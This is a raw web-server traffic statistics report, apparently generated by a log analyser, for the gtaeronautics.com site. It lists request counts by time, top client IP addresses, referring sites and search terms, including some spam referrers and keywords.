5	Rr	1	0.000	2023	03	31	14	30
5	Rr	5	0.000	2023	03	31	14	25
5	Rr	0	0.000	2023	03	31	14	20
5	Rr	1	0.000	2023	03	31	14	15
5	Rr	0	0.000	2023	03	31	14	10
5	Rr	0	0.000	2023	03	31	14	05
5	Rr	0	0.000	2023	03	31	14	00
5	Rr	0	0.000	2023	03	31	13	55
5	Rr	0	0.000	2023	03	31	13	50
5	Rr	0	0.000	2023	03	31	13	45
5	Rr	1	0.000	2023	03	31	13	40
5	Rr	0	0.000	2023	03	31	13	35
5	Rr	0	0.000	2023	03	31	13	30
5	Rr	0	0.000	2023	03	31	13	25
5	Rr	0	0.000	2023	03	31	13	20
5	Rr	0	0.000	2023	03	31	13	15
5	Rr	0	0.000	2023	03	31	13	10
5	Rr	0	0.000	2023	03	31	13	05
5	Rr	0	0.000	2023	03	31	13	00
5	Rr	0	0.000	2023	03	31	12	55
5	Rr	0	0.000	2023	03	31	12	50
5	Rr	0	0.000	2023	03	31	12	45
5	Rr	1	0.000	2023	03	31	12	40
5	Rr	1	0.000	2023	03	31	12	35
5	Rr	0	0.000	2023	03	31	12	30
5	Rr	0	0.000	2023	03	31	12	25
5	Rr	0	0.000	2023	03	31	12	20
5	Rr	0	0.000	2023	03	31	12	15
5	Rr	1	0.000	2023	03	31	12	10
5	Rr	0	0.000	2023	03	31	12	05
5	Rr	0	0.000	2023	03	31	12	00
5	Rr	0	0.000	2023	03	31	11	55
5	Rr	0	0.000	2023	03	31	11	50
5	Rr	1	0.000	2023	03	31	11	45
5	Rr	2	0.000	2023	03	31	11	40
5	Rr	0	0.000	2023	03	31	11	35
5	Rr	0	0.000	2023	03	31	11	30
5	Rr	0	0.000	2023	03	31	11	25
5	Rr	0	0.000	2023	03	31	11	20
5	Rr	1	0.000	2023	03	31	11	15
5	Rr	0	0.000	2023	03	31	11	10
5	Rr	0	0.000	2023	03	31	11	05
5	Rr	1	0.000	2023	03	31	11	00
5	Rr	0	0.000	2023	03	31	10	55
5	Rr	25	0.002	2023	03	31	10	50
5	Rr	1	0.000	2023	03	31	10	45
5	Rr	0	0.000	2023	03	31	10	40
5	Rr	0	0.000	2023	03	31	10	35
5	Rr	0	0.000	2023	03	31	10	30
5	Rr	0	0.000	2023	03	31	10	25
5	Rr	0	0.000	2023	03	31	10	20
5	Rr	0	0.000	2023	03	31	10	15
5	Rr	0	0.000	2023	03	31	10	10
5	Rr	0	0.000	2023	03	31	10	05
5	Rr	0	0.000	2023	03	31	10	00
5	Rr	1	0.000	2023	03	31	09	55
5	Rr	1	0.000	2023	03	31	09	50
5	Rr	0	0.000	2023	03	31	09	45
5	Rr	1	0.000	2023	03	31	09	40
5	Rr	0	0.000	2023	03	31	09	35
5	Rr	0	0.000	2023	03	31	09	30
5	Rr	1	0.000	2023	03	31	09	25
5	Rr	0	0.000	2023	03	31	09	20
5	Rr	0	0.000	2023	03	31	09	15
5	Rr	0	0.000	2023	03	31	09	10
5	Rr	0	0.000	2023	03	31	09	05
5	Rr	1	0.000	2023	03	31	09	00
5	Rr	0	0.000	2023	03	31	08	55
5	Rr	0	0.000	2023	03	31	08	50
5	Rr	0	0.000	2023	03	31	08	45
5	Rr	1	0.000	2023	03	31	08	40
5	Rr	0	0.000	2023	03	31	08	35
5	Rr	0	0.000	2023	03	31	08	30
5	Rr	0	0.000	2023	03	31	08	25
5	Rr	1	0.000	2023	03	31	08	20
5	Rr	0	0.000	2023	03	31	08	15
5	Rr	0	0.000	2023	03	31	08	10
5	Rr	1	0.000	2023	03	31	08	05
5	Rr	0	0.000	2023	03	31	08	00
5	Rr	0	0.000	2023	03	31	07	55
5	Rr	0	0.000	2023	03	31	07	50
5	Rr	0	0.000	2023	03	31	07	45
5	Rr	0	0.000	2023	03	31	07	40
5	Rr	0	0.000	2023	03	31	07	35
5	Rr	0	0.000	2023	03	31	07	30
5	Rr	1	0.000	2023	03	31	07	25
5	Rr	0	0.000	2023	03	31	07	20
5	Rr	0	0.000	2023	03	31	07	15
5	Rr	0	0.000	2023	03	31	07	10
5	Rr	0	0.000	2023	03	31	07	05
5	Rr	0	0.000	2023	03	31	07	00
5	Rr	1	0.000	2023	03	31	06	55
5	Rr	1	0.000	2023	03	31	06	50
5	Rr	0	0.000	2023	03	31	06	45
5	Rr	4	0.000	2023	03	31	06	40
5	Rr	0	0.000	2023	03	31	06	35
5	Rr	1	0.000	2023	03	31	06	30
5	Rr	3	0.000	2023	03	31	06	25
5	Rr	0	0.000	2023	03	31	06	20
5	Rr	0	0.000	2023	03	31	06	15
5	Rr	0	0.000	2023	03	31	06	10
5	Rr	0	0.000	2023	03	31	06	05
5	Rr	0	0.000	2023	03	31	06	00
5	Rr	0	0.000	2023	03	31	05	55
5	Rr	3	0.000	2023	03	31	05	50
5	Rr	1	0.000	2023	03	31	05	45
5	Rr	0	0.000	2023	03	31	05	40
5	Rr	0	0.000	2023	03	31	05	35
5	Rr	0	0.000	2023	03	31	05	30
5	Rr	2	0.000	2023	03	31	05	25
5	Rr	2	0.000	2023	03	31	05	20
5	Rr	0	0.000	2023	03	31	05	15
5	Rr	1	0.000	2023	03	31	05	10
5	Rr	0	0.000	2023	03	31	05	05
5	Rr	0	0.000	2023	03	31	05	00
5	Rr	0	0.000	2023	03	31	04	55
5	Rr	0	0.000	2023	03	31	04	50
5	Rr	0	0.000	2023	03	31	04	45
5	Rr	0	0.000	2023	03	31	04	40
5	Rr	0	0.000	2023	03	31	04	35
5	Rr	0	0.000	2023	03	31	04	30
5	Rr	0	0.000	2023	03	31	04	25
5	Rr	0	0.000	2023	03	31	04	20
5	Rr	0	0.000	2023	03	31	04	15
5	Rr	0	0.000	2023	03	31	04	10
5	Rr	1	0.000	2023	03	31	04	05
5	Rr	0	0.000	2023	03	31	04	00
5	Rr	8	0.001	2023	03	31	03	55
5	Rr	0	0.000	2023	03	31	03	50
5	Rr	0	0.000	2023	03	31	03	45
5	Rr	0	0.000	2023	03	31	03	40
5	Rr	0	0.000	2023	03	31	03	35
5	Rr	0	0.000	2023	03	31	03	30
5	Rr	0	0.000	2023	03	31	03	25
5	Rr	0	0.000	2023	03	31	03	20
5	Rr	0	0.000	2023	03	31	03	15
5	Rr	1	0.000	2023	03	31	03	10
5	Rr	0	0.000	2023	03	31	03	05
5	Rr	0	0.000	2023	03	31	03	00
5	Rr	2	0.000	2023	03	31	02	55
5	Rr	0	0.000	2023	03	31	02	50
5	Rr	0	0.000	2023	03	31	02	45
5	Rr	0	0.000	2023	03	31	02	40
5	Rr	0	0.000	2023	03	31	02	35
5	Rr	1	0.000	2023	03	31	02	30
5	Rr	0	0.000	2023	03	31	02	25
5	Rr	1	0.000	2023	03	31	02	20
5	Rr	2	0.000	2023	03	31	02	15
5	Rr	0	0.000	2023	03	31	02	10
5	Rr	2	0.000	2023	03	31	02	05
5	Rr	0	0.000	2023	03	31	02	00
5	Rr	0	0.000	2023	03	31	01	55
5	Rr	0	0.000	2023	03	31	01	50
5	Rr	0	0.000	2023	03	31	01	45
5	Rr	0	0.000	2023	03	31	01	40
5	Rr	2	0.000	2023	03	31	01	35
5	Rr	3	0.000	2023	03	31	01	30
5	Rr	0	0.000	2023	03	31	01	25
5	Rr	0	0.000	2023	03	31	01	20
5	Rr	2	0.000	2023	03	31	01	15
5	Rr	0	0.000	2023	03	31	01	10
5	Rr	0	0.000	2023	03	31	01	05
5	Rr	2	0.000	2023	03	31	01	00
5	Rr	0	0.000	2023	03	31	00	55
5	Rr	0	0.000	2023	03	31	00	50
5	Rr	0	0.000	2023	03	31	00	45
5	Rr	0	0.000	2023	03	31	00	40
5	Rr	0	0.000	2023	03	31	00	35
5	Rr	0	0.000	2023	03	31	00	30
5	Rr	0	0.000	2023	03	31	00	25
5	Rr	0	0.000	2023	03	31	00	20
5	Rr	0	0.000	2023	03	31	00	15
5	Rr	0	0.000	2023	03	31	00	10
5	Rr	0	0.000	2023	03	31	00	05
5	Rr	0	0.000	2023	03	31	00	00
5	Rr	0	0.000	2023	03	30	23	55
5	Rr	0	0.000	2023	03	30	23	50
5	Rr	0	0.000	2023	03	30	23	45
5	Rr	6	0.001	2023	03	30	23	40
5	Rr	0	0.000	2023	03	30	23	35
5	Rr	0	0.000	2023	03	30	23	30
5	Rr	0	0.000	2023	03	30	23	25
5	*BT	R	715	2020	12	11	23	20
7	Rr	3409	0.304	00	00
7	Rr	3840	0.343	00	05
7	Rr	3577	0.319	00	10
7	Rr	3041	0.271	00	15
7	Rr	3711	0.331	00	20
7	Rr	4125	0.368	00	25
7	Rr	3644	0.325	00	30
7	Rr	3574	0.319	00	35
7	Rr	3675	0.328	00	40
7	Rr	3817	0.341	00	45
7	Rr	3829	0.342	00	50
7	Rr	3342	0.298	00	55
7	Rr	3306	0.295	01	00
7	Rr	3735	0.333	01	05
7	Rr	3654	0.326	01	10
7	Rr	3681	0.328	01	15
7	Rr	3749	0.335	01	20
7	Rr	3351	0.299	01	25
7	Rr	3528	0.315	01	30
7	Rr	3641	0.325	01	35
7	Rr	3704	0.331	01	40
7	Rr	3526	0.315	01	45
7	Rr	3350	0.299	01	50
7	Rr	3719	0.332	01	55
7	Rr	3454	0.308	02	00
7	Rr	3475	0.310	02	05
7	Rr	3397	0.303	02	10
7	Rr	3938	0.351	02	15
7	Rr	3665	0.327	02	20
7	Rr	3683	0.329	02	25
7	Rr	3714	0.331	02	30
7	Rr	3830	0.342	02	35
7	Rr	3637	0.325	02	40
7	Rr	3610	0.322	02	45
7	Rr	3342	0.298	02	50
7	Rr	3933	0.351	02	55
7	Rr	3755	0.335	03	00
7	Rr	3467	0.309	03	05
7	Rr	3406	0.304	03	10
7	Rr	3598	0.321	03	15
7	Rr	3230	0.288	03	20
7	Rr	3204	0.286	03	25
7	Rr	3408	0.304	03	30
7	Rr	3468	0.309	03	35
7	Rr	3604	0.322	03	40
7	Rr	4035	0.360	03	45
7	Rr	4766	0.425	03	50
7	Rr	3822	0.341	03	55
7	Rr	3486	0.311	04	00
7	Rr	3469	0.310	04	05
7	Rr	3548	0.317	04	10
7	Rr	3824	0.341	04	15
7	Rr	3772	0.337	04	20
7	Rr	3510	0.313	04	25
7	Rr	3391	0.303	04	30
7	Rr	3337	0.298	04	35
7	Rr	3124	0.279	04	40
7	Rr	3703	0.330	04	45
7	Rr	3271	0.292	04	50
7	Rr	3323	0.297	04	55
7	Rr	3075	0.274	05	00
7	Rr	3002	0.268	05	05
7	Rr	3497	0.312	05	10
7	Rr	3373	0.301	05	15
7	Rr	3579	0.319	05	20
7	Rr	3465	0.309	05	25
7	Rr	3600	0.321	05	30
7	Rr	3435	0.307	05	35
7	Rr	3083	0.275	05	40
7	Rr	3259	0.291	05	45
7	Rr	3149	0.281	05	50
7	Rr	3250	0.290	05	55
7	Rr	3278	0.292	06	00
7	Rr	3927	0.350	06	05
7	Rr	3312	0.296	06	10
7	Rr	3400	0.303	06	15
7	Rr	3148	0.281	06	20
7	Rr	3221	0.287	06	25
7	Rr	3146	0.281	06	30
7	Rr	3230	0.288	06	35
7	Rr	3328	0.297	06	40
7	Rr	3419	0.305	06	45
7	Rr	2774	0.248	06	50
7	Rr	2732	0.244	06	55
7	Rr	3391	0.303	07	00
7	Rr	3014	0.269	07	05
7	Rr	3039	0.271	07	10
7	Rr	2937	0.262	07	15
7	Rr	3440	0.307	07	20
7	Rr	3594	0.321	07	25
7	Rr	3755	0.335	07	30
7	Rr	3357	0.300	07	35
7	Rr	2877	0.257	07	40
7	Rr	3074	0.274	07	45
7	Rr	2834	0.253	07	50
7	Rr	2990	0.267	07	55
7	Rr	3106	0.277	08	00
7	Rr	3241	0.289	08	05
7	Rr	3105	0.277	08	10
7	Rr	3077	0.275	08	15
7	Rr	3000	0.268	08	20
7	Rr	3090	0.276	08	25
7	Rr	3445	0.307	08	30
7	Rr	3138	0.280	08	35
7	Rr	3121	0.278	08	40
7	Rr	2928	0.261	08	45
7	Rr	2875	0.257	08	50
7	Rr	2812	0.251	08	55
7	Rr	2856	0.255	09	00
7	Rr	3139	0.280	09	05
7	Rr	2892	0.258	09	10
7	Rr	2740	0.244	09	15
7	Rr	3161	0.282	09	20
7	Rr	2986	0.266	09	25
7	Rr	3003	0.268	09	30
7	Rr	2860	0.255	09	35
7	Rr	3075	0.274	09	40
7	Rr	3024	0.270	09	45
7	Rr	2707	0.242	09	50
7	Rr	2920	0.261	09	55
7	Rr	2961	0.264	10	00
7	Rr	2703	0.241	10	05
7	Rr	3021	0.270	10	10
7	Rr	2818	0.251	10	15
7	Rr	2676	0.239	10	20
7	Rr	3200	0.286	10	25
7	Rr	2768	0.247	10	30
7	Rr	3012	0.269	10	35
7	Rr	2990	0.267	10	40
7	Rr	2929	0.261	10	45
7	Rr	3687	0.329	10	50
7	Rr	3573	0.319	10	55
7	Rr	4366	0.390	11	00
7	Rr	3335	0.298	11	05
7	Rr	3226	0.288	11	10
7	Rr	3265	0.291	11	15
7	Rr	3259	0.291	11	20
7	Rr	2989	0.267	11	25
7	Rr	3251	0.290	11	30
7	Rr	3111	0.278	11	35
7	Rr	3298	0.294	11	40
7	Rr	3186	0.284	11	45
7	Rr	3160	0.282	11	50
7	Rr	3341	0.298	11	55
7	Rr	3835	0.342	12	00
7	Rr	3467	0.309	12	05
7	Rr	3484	0.311	12	10
7	Rr	3021	0.270	12	15
7	Rr	3191	0.285	12	20
7	Rr	3143	0.280	12	25
7	Rr	3182	0.284	12	30
7	Rr	3067	0.274	12	35
7	Rr	3206	0.286	12	40
7	Rr	3365	0.300	12	45
7	Rr	3053	0.272	12	50
7	Rr	3404	0.304	12	55
7	Rr	3385	0.302	13	00
7	Rr	3263	0.291	13	05
7	Rr	3636	0.324	13	10
7	Rr	3353	0.299	13	15
7	Rr	3385	0.302	13	20
7	Rr	3543	0.316	13	25
7	Rr	3471	0.310	13	30
7	Rr	3949	0.352	13	35
7	Rr	3562	0.318	13	40
7	Rr	3086	0.275	13	45
7	Rr	3763	0.336	13	50
7	Rr	3628	0.324	13	55
7	Rr	3748	0.334	14	00
7	Rr	3970	0.354	14	05
7	Rr	4008	0.358	14	10
7	Rr	4196	0.374	14	15
7	Rr	4277	0.382	14	20
7	Rr	4082	0.364	14	25
7	Rr	4545	0.406	14	30
7	Rr	4055	0.362	14	35
7	Rr	4010	0.358	14	40
7	Rr	4054	0.362	14	45
7	Rr	4070	0.363	14	50
7	Rr	4452	0.397	14	55
7	Rr	4525	0.404	15	00
7	Rr	4690	0.418	15	05
7	Rr	4244	0.379	15	10
7	Rr	4446	0.397	15	15
7	Rr	4152	0.370	15	20
7	Rr	4567	0.408	15	25
7	Rr	5037	0.449	15	30
7	Rr	4370	0.390	15	35
7	Rr	4859	0.434	15	40
7	Rr	4592	0.410	15	45
7	Rr	4695	0.419	15	50
7	Rr	5057	0.451	15	55
7	Rr	4933	0.440	16	00
7	Rr	5367	0.479	16	05
7	Rr	4774	0.426	16	10
7	Rr	5249	0.468	16	15
7	Rr	4954	0.442	16	20
7	Rr	4471	0.399	16	25
7	Rr	4829	0.431	16	30
7	Rr	5200	0.464	16	35
7	Rr	4942	0.441	16	40
7	Rr	5174	0.462	16	45
7	Rr	5158	0.460	16	50
7	Rr	4958	0.442	16	55
7	Rr	5018	0.448	17	00
7	Rr	4834	0.431	17	05
7	Rr	5389	0.481	17	10
7	Rr	5100	0.455	17	15
7	Rr	4940	0.441	17	20
7	Rr	4953	0.442	17	25
7	Rr	5092	0.454	17	30
7	Rr	5197	0.464	17	35
7	Rr	5072	0.453	17	40
7	Rr	5182	0.462	17	45
7	Rr	4859	0.434	17	50
7	Rr	4870	0.435	17	55
7	Rr	4400	0.393	18	00
7	Rr	4837	0.432	18	05
7	Rr	5691	0.508	18	10
7	Rr	5205	0.464	18	15
7	Rr	4874	0.435	18	20
7	Rr	5138	0.458	18	25
7	Rr	5083	0.454	18	30
7	Rr	5110	0.456	18	35
7	Rr	5079	0.453	18	40
7	Rr	4989	0.445	18	45
7	Rr	5105	0.456	18	50
7	Rr	5217	0.466	18	55
7	Rr	5485	0.489	19	00
7	Rr	5372	0.479	19	05
7	Rr	5289	0.472	19	10
7	Rr	4820	0.430	19	15
7	Rr	4959	0.442	19	20
7	Rr	4639	0.414	19	25
7	Rr	4683	0.418	19	30
7	Rr	4952	0.442	19	35
7	Rr	5145	0.459	19	40
7	Rr	5253	0.469	19	45
7	Rr	4707	0.420	19	50
7	Rr	4764	0.425	19	55
7	Rr	4588	0.409	20	00
7	Rr	5352	0.478	20	05
7	Rr	5123	0.457	20	10
7	Rr	4742	0.423	20	15
7	Rr	5040	0.450	20	20
7	Rr	4885	0.436	20	25
7	Rr	4507	0.402	20	30
7	Rr	4654	0.415	20	35
7	Rr	4915	0.439	20	40
7	Rr	5125	0.457	20	45
7	Rr	4612	0.412	20	50
7	Rr	5028	0.449	20	55
7	Rr	5357	0.478	21	00
7	Rr	4638	0.414	21	05
7	Rr	4820	0.430	21	10
7	Rr	4653	0.415	21	15
7	Rr	4107	0.366	21	20
7	Rr	4855	0.433	21	25
7	Rr	4337	0.387	21	30
7	Rr	4470	0.399	21	35
7	Rr	4420	0.394	21	40
7	Rr	4484	0.400	21	45
7	Rr	4799	0.428	21	50
7	Rr	4256	0.380	21	55
7	Rr	4252	0.379	22	00
7	Rr	4122	0.368	22	05
7	Rr	4325	0.386	22	10
7	Rr	3832	0.342	22	15
7	Rr	4588	0.409	22	20
7	Rr	4498	0.401	22	25
7	Rr	4138	0.369	22	30
7	Rr	4373	0.390	22	35
7	Rr	4067	0.363	22	40
7	Rr	4084	0.364	22	45
7	Rr	4246	0.379	22	50
7	Rr	3959	0.353	22	55
7	Rr	4402	0.393	23	00
7	Rr	4140	0.369	23	05
7	Rr	4140	0.369	23	10
7	Rr	4205	0.375	23	15
7	Rr	4913	0.438	23	20
7	Rr	3812	0.340	23	25
7	Rr	3642	0.325	23	30
7	Rr	3958	0.353	23	35
7	Rr	3752	0.335	23	40
7	Rr	3578	0.319	23	45
7	Rr	3799	0.339	23	50
7	Rr	3510	0.313	23	55
o	*f	0R	r
o	lRQ	1	1120693	1377520877	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	46413	2.589	66.249
Z	lRb	1	41054	1.451	69
Z	lRb	1	31603	2.015	35
Z	lRb	1	25176	0.673	46
Z	lRb	1	24178	2.589	157.55
Z	lRb	1	23955	1.800	34
Z	lRb	1	22309	2.724	70
Z	lRb	1	20909	2.854	54
Z	lRb	1	19035	2.016	207.46
Z	lRb	1	18503	2.331	40
Z	lRb	1	16677	3.431	98
Z	lRb	1	16135	1.204	76
Z	lRb	1	14515	1.546	72
Z	lRb	1	12906	1.249	5
Z	lRb	1	12418	0.952	123
Z	lRb	1	12399	0.942	75
Z	lRb	1	12111	0.071	178.137
Z	lRb	1	11588	2.253	51
Z	lRb	1	11249	0.741	74
Z	lRb	1	10717	1.096	104
Z	lRb	1	716843	65.475	[not listed: 8959]
S	*f	-50P	r
S	Rb	4702	0.309	14.33.246.211
S	Rb	3866	0.623	192.234.235.103
S	Rb	3248	0.194	192.99.15.146
S	Rb	2388	0.021	49.7.20.111
S	Rb	2341	0.107	100.43.83.148
S	Rb	2175	0.009	49.7.20.105
S	Rb	1992	0.054	66.249.75.109
S	Rb	1829	0.117	37.59.14.116
S	Rb	1781	0.169	75.98.173.33
S	Rb	1597	0.102	78.155.138.20
S	Rb	1543	0.058	199.21.99.79
S	Rb	1459	0.008	92.249.127.111
S	Rb	1422	0.215	79.125.27.96
S	Rb	1335	0.047	49.7.20.102
S	Rb	1330	0.014	109.102.111.58
S	Rb	1312	0.035	205.203.134.197
S	Rb	1304	0.151	5.196.13.127
S	Rb	1276	0.094	208.115.113.82
S	Rb	1270	0.051	95.108.248.29
S	Rb	1155	0.182	75.98.173.84
S	Rb	1142	0.001	91.207.9.226
S	Rb	1109	0.213	216.244.66.229
S	Rb	1107	0.013	66.249.69.97
S	Rb	1081	0.015	66.249.69.81
S	Rb	1051	0.025	66.249.69.192
S	Rb	1048	0.067	157.90.182.26
S	Rb	1047	0.014	106.38.241.144
S	Rb	1039	0.012	66.249.69.89
S	Rb	1030	0.077	5.255.250.90
S	Rb	1025	0.034	144.76.27.118
S	Rb	1024	0.058	95.108.150.235
S	Rb	1012	0.064	192.99.6.132
S	Rb	957	0.143	199.21.99.197
S	Rb	951	0.049	66.249.73.133
S	Rb	815	0.023	178.63.23.80
S	Rb	812	0.073	66.249.64.90
S	Rb	808	0.143	149.202.211.239
S	Rb	791	0.051	192.99.7.55
S	Rb	786	0.092	66.11.128.152
S	Rb	777	0.001	193.150.120.14
S	Rb	760	0.040	208.115.113.92
S	Rb	754	0.053	49.7.20.108
S	Rb	744	0.008	109.102.111.20
S	Rb	739	0.007	109.102.111.50
S	Rb	721	0.003	106.38.241.177
S	Rb	704	0.001	109.120.157.179
S	Rb	698	0.020	220.181.125.162
S	Rb	694	0.030	78.155.138.30
S	Rb	686	0.016	66.249.65.212
S	Rb	664	0.042	94.23.59.173
S	Rb	1054792	96.053	[not listed: 98862]
s	*FR	2013	12	18	21	53
s	*LR	2023	03	31	23	19
s	*f	-20R	s
s	lRS	1	246521	507	http://www.gtaeronautics.com/
s	lRS	1	59135	180	http://gtaeronautics.com/
s	lRS	1	5684	29	https://www.google.com/
s	lRS	1	328	2	https://www.bing.com/
s	lRS	1	317	1	https://www.thomasnet.com/
s	lRS	1	1560	0	http://www.google.com/
s	lRS	1	1275	0	http://www.baidu.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	328	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	280	0	https://www.google.co.in/
s	lRS	1	262	0	http://google.co.jp/
s	lRS	1	259	0	http://baidu.com/
s	lRS	1	236	0	http://www.thomasnet.com/
s	lRS	1	49205	2	[not listed: 4404]
f	*FR	2013	12	18	21	53
f	*LR	2023	03	31	23	19
f	*f	-30R	s
f	lRS	1	170524	444	http://www.gtaeronautics.com/
f	lRS	1	40613	151	http://gtaeronautics.com/
f	lRS	1	1327	20	http://gtaeronautics.com/contactus.html
f	lRS	1	1689	17	http://www.gtaeronautics.com/contactus.html
f	lRS	1	2906	12	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	7783	11	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	11095	7	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	1906	5	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	6617	3	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	2289	3	http://www.gtaeronautics.com/SRU.html
f	lRS	1	1791	3	http://gtaeronautics.com/aboutus.html
f	lRS	1	1616	3	http://www.gtaeronautics.com/EMPLOYMENT.html
f	lRS	1	1236	3	http://gtaeronautics.com/index.html
f	lRS	1	5197	2	https://www.google.com/
f	lRS	1	2594	1	http://www.gtaeronautics.com/CompNews.html
f	lRS	1	5747	0	http://www.gtaeronautics.com/index.html
f	lRS	1	5680	0	http://gtaeronautics.com/IndNews.html
f	lRS	1	4702	0	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	2716	0	http://www.gtaeronautics.com/pna.html
f	lRS	1	2585	0	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	2208	0	http://www.gtaeronautics.com/RD.html
f	lRS	1	2090	0	http://www.gtaeronautics.com/uasfc.html
f	lRS	1	2063	0	http://www.gtaeronautics.com/GT50T RPAS.html
f	lRS	1	2011	0	http://www.gtaeronautics.com/CFMT.html
f	lRS	1	1904	0	http://www.gtaeronautics.com/consultinga.html
f	lRS	1	1528	0	http://www.gtaeronautics.com/compnews.html
f	lRS	1	1289	0	http://www.gtaeronautics.com/links.html
f	lRS	1	1159	0	http://www.trainingindustry.com/
f	lRS	1	1080	0	http://www.baidu.com/s
f	lRS	1	1005	0	http://www.gtaeronautics.com/FAQ.html
f	lRS	1	72849	36	[not listed: 5094]
n	*FR	2013	12	19	00	28
n	*LR	2020	10	14	09	11
n	*f	0.500000%Q	s
n	Rq	1	713.598	kit
n	Rq	1	713.598	method
n	Rq	2	226.338	crew
n	Rq	28	88.002	aeronautical
n	Rq	1	713.598	airplane.com
n	Rq	5	1166.274	faa
n	Rq	40	767.016	gt
n	Rq	1	713.598	moldings
n	Rq	1	713.598	twin
n	Rq	1	713.598	taranis
n	Rq	2	713.598	installerex
n	Rq	2	713.598	http://gtaeronautics.com/
n	Rq	20	1131.690	in
n	Rq	1	713.598	scale
n	Rq	1	713.598	observer
n	Rq	1	713.598	drawing?
n	Rq	2	713.598	is
n	Rq	1	713.598	making
n	Rq	2	226.338	fiber
n	Rq	1	713.598	mitsubishi
n	Rq	1	713.598	fuze
n	Rq	1	713.598	http://www.gtaeronautics.com/indnews.html
n	Rq	92	713.598	semalt.com
n	Rq	1	713.598	consultant
n	Rq	15	452.676	manufacturing
n	Rq	1	713.598	2
n	Rq	1	713.598	base
n	Rq	14	383.508	6
n	Rq	1	713.598	http://gtaeronautics.com/indnews.html
n	Rq	1	713.598	always
n	Rq	28	1027.938	engineering
n	Rq	1	713.598	northrop
n	Rq	1	713.598	bandwidth
n	Rq	1	713.598	vegas
n	Rq	3	226.338	basic
n	Rq	1	713.598	qinetiq
n	Rq	1	713.598	tooling
n	Rq	1	713.598	on
n	Rq	1	713.598	heavy
n	Rq	9	905.352	drawings
n	Rq	1	713.598	fia
n	Rq	4	713.598	louis%20vuitton%20fashion%20valley%20phone%20number
n	Rq	3	713.598	llc
n	Rq	3	939.936	rullman
n	Rq	1	713.598	cowling
n	Rq	32	939.936	sale
n	Rq	64	679.014	outlet
n	Rq	1	713.598	rotax
n	Rq	1	713.598	ucav
n	Rq	28	314.340	texan
n	Rq	1	713.598	a
n	Rq	2	713.598	customer
n	Rq	1	713.598	rpa
n	Rq	2	226.338	110cc
n	Rq	30	713.598	designer
n	Rq	20	1166.274	www.gtaeronautics.com
n	Rq	1	713.598	work
n	Rq	1	713.598	thomas
n	Rq	1	713.598	engie
n	Rq	1	713.598	qualification
n	Rq	1	713.598	custom
n	Rq	1	713.598	mk3
n	Rq	1	713.598	t
n	Rq	1	713.598	uavs
n	Rq	1	713.598	w
n	Rq	2	713.598	satisfaction
n	Rq	2	226.338	x
n	Rq	1	713.598	crews
n	Rq	3	713.598	photos
n	Rq	1	713.598	finnemeccia
n	Rq	2	226.338	glass
n	Rq	1	939.936	to
n	Rq	1	713.598	gcs
n	Rq	5	1166.274	engineer
n	Rq	1	713.598	government
n	Rq	1	713.598	operator
n	Rq	6	679.014	aircraft
n	Rq	1	713.598	with
n	Rq	97	226.338	number
n	Rq	4	939.936	for
n	Rq	1	713.598	december
n	Rq	2	226.338	aero
n	Rq	9	226.338	equipment
n	Rq	2	226.338	engine
n	Rq	1	713.598	mq1
n	Rq	2	226.338	wy
n	Rq	1	713.598	custum
n	Rq	1	713.598	g.t
n	Rq	1	713.598	mechanics
n	Rq	1	226.338	motors
n	Rq	1	713.598	tdw
n	Rq	32	1166.274	luggage
n	Rq	1	713.598	opportunities
n	Rq	175	122.586	vuitton
n	Rq	1	713.598	show
n	Rq	1	939.936	the
n	Rq	1	713.598	luggages
n	Rq	1	713.598	stroke
n	Rq	2	713.598	explore
n	Rq	39	226.338	handbags
n	Rq	2	226.338	electric
n	Rq	1	713.598	space
n	Rq	1	226.338	air
n	Rq	1	713.598	quote
n	Rq	1	713.598	require
n	Rq	1	713.598	mpp
n	Rq	4	226.338	jobs
n	Rq	5	1166.274	uas
n	Rq	1	713.598	anything
n	Rq	1	713.598	china
n	Rq	1	713.598	airplane
n	Rq	10	1131.690	uav
n	Rq	2	713.598	wmaid.com
n	Rq	3	452.676	drone
n	Rq	7	191.754	fiberglass
n	Rq	2	713.598	facebook
n	Rq	1	713.598	college
n	Rq	4	452.676	onboard
n	Rq	3	226.338	gtaeronautics.com
n	Rq	1	713.598	qulificationa
n	Rq	21	870.768	simi
n	Rq	1	713.598	and
n	Rq	5	939.936	flight
n	Rq	17	870.768	at6
n	Rq	1	713.598	xtreme
n	Rq	1	713.598	maintenance
n	Rq	1	713.598	cody
n	Rq	1	713.598	systems
n	Rq	1	713.598	any
n	Rq	1	713.598	tom
n	Rq	1	713.598	payload
n	Rq	2	226.338	gta
n	Rq	2	713.598	granger
n	Rq	8	191.754	extreme
n	Rq	6	1166.274	molding
n	Rq	2	713.598	easylifeapp
n	Rq	1	713.598	rating
n	Rq	2	713.598	whitelaw
n	Rq	126	191.754	fashion
n	Rq	2	226.338	ice
n	Rq	2	713.598	http://www.gtaeronautics.com/compnews.html
n	Rq	5	226.338	engineers
n	Rq	3	226.338	composite
n	Rq	1	713.598	skyforce
n	Rq	1	713.598	eengineer
n	Rq	175	122.586	louis
n	Rq	8	713.598	store
n	Rq	4	452.676	starter
n	Rq	14	452.676	cheap
n	Rq	1	713.598	diamond
n	Rq	10	418.092	bme
n	Rq	1	713.598	america2009
n	Rq	7	713.598	content
n	Rq	1	713.598	challenge
n	Rq	2	226.338	aeronautic
n	Rq	1	713.598	piece
n	Rq	1	713.598	how
n	Rq	1	713.598	male
n	Rq	2	226.338	design
n	Rq	2	226.338	flying
n	Rq	1	713.598	carbon
n	Rq	1	713.598	operation
n	Rq	2	713.598	profile
n	Rq	1	713.598	tomas
n	Rq	1	713.598	cia
n	Rq	1	713.598	hummingbird
n	Rq	1	713.598	iron
n	Rq	1	713.598	california
n	Rq	1	713.598	amphibian
n	Rq	1	713.598	110
